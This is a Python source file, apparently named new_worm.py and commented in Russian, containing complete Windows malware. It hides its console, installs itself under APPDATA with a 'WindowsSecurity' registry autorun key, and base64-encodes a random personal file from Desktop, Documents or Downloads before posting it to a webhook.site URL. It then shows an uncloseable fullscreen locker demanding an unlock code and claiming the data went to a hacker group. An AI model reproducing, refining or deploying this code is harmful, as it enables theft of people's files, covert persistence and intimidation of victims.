# language: Python, file: new_worm.py
import os, sys, json, time, threading, shutil, ctypes, tempfile, random, base64
import urllib.request
import tkinter as tk
from tkinter import messagebox

# ================= НАСТРОЙКИ =================
WEBHOOK_URL = "https://webhook.site/975b8ffd-eda8-41b7-afbc-fbd48a4968fe" 
TARGET_TEXT = "ВСЕ ВАШИ ДАННЫЕ БЫЛИ ОТПРАВЛЕНЫ\nВ ХАКЕРСКУЮ ОРГАНИЗАЦИЮ AQDIAMOND\n\nЧТОБЫ РАЗБЛОКИРОВАТЬ КОМПЬЮТЕР,\nВВЕДИТЕ КОД:"
PASSWORD = "0001"
SAFE_MODE = False 
# ============================================

LOG_FILE = os.path.join(tempfile.gettempdir(), ".sys_log.txt")

def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except: pass

# --- 1. КРАЖА ФАЙЛА ---
def steal_random_file():
    if SAFE_MODE: return
    log("Поиск файла...")
    
    user_profile = os.path.expanduser("~")
    search_dirs = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Рабочий стол"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Документы"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Загрузки")
    ]
    
    found_files = []
    for folder in search_dirs:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.lower().endswith(('.txt', '.pdf', '.docx', '.jpg', '.png')):
                        found_files.append(os.path.join(root, file))
    
    if not found_files:
        log("Файлы не найдены.")
        return

    target_file = random.choice(found_files)
    log(f"Выбран файл: {target_file}")
    
    try:
        with open(target_file, "rb") as f:
            file_data = f.read()
        
        b64_data = base64.b64encode(file_data).decode('utf-8')
        filename = os.path.basename(target_file)
        
        send_webhook({
            "type": "STOLEN_FILE",
            "filename": filename,
            "data": b64_data
        })
        log("Файл отправлен!")
    except Exception as e:
        log(f"Ошибка чтения: {e}")

# --- 2. ЛОКЕР ---
def show_locker():
    if SAFE_MODE: return
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True) 
    root.configure(bg="black")
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    lbl = tk.Label(root, text=TARGET_TEXT, fg="red", bg="black", font=("Arial", 28, "bold"), justify="center")
    lbl.pack(pady=100)

    entry = tk.Entry(root, font=("Arial", 24), justify="center", show="*")
    entry.pack(pady=20)
    entry.focus_force()

    def check():
        if entry.get() == PASSWORD:
            root.destroy()
        else:
            messagebox.showerror("Ошибка", "Неверный код!")

    btn = tk.Button(root, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 20, "bold"), command=check)
    btn.pack(pady=30)
    root.mainloop()

# --- 3. АВТОЗАПУСК ---
def persist():
    if SAFE_MODE: return
    try:
        appdata = os.getenv("APPDATA")
        dest = os.path.join(appdata, "WindowsSecurity.exe")
        if not os.path.exists(dest) and getattr(sys, "frozen", False):
            shutil.copy(sys.executable, dest)
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurity", 0, winreg.REG_SZ, dest)
            winreg.CloseKey(key)
    except: pass

# --- 4. ОТПРАВКА ---
def send_webhook(data):
    if SAFE_MODE: return
    try:
        req = urllib.request.Request(
            WEBHOOK_URL, 
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req, timeout=5)
    except: pass

def main():
    try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass
    
    persist()
    threading.Thread(target=steal_random_file, daemon=True).start()
    time.sleep(5)
    show_locker()

if __name__ == "__main__":
    main()
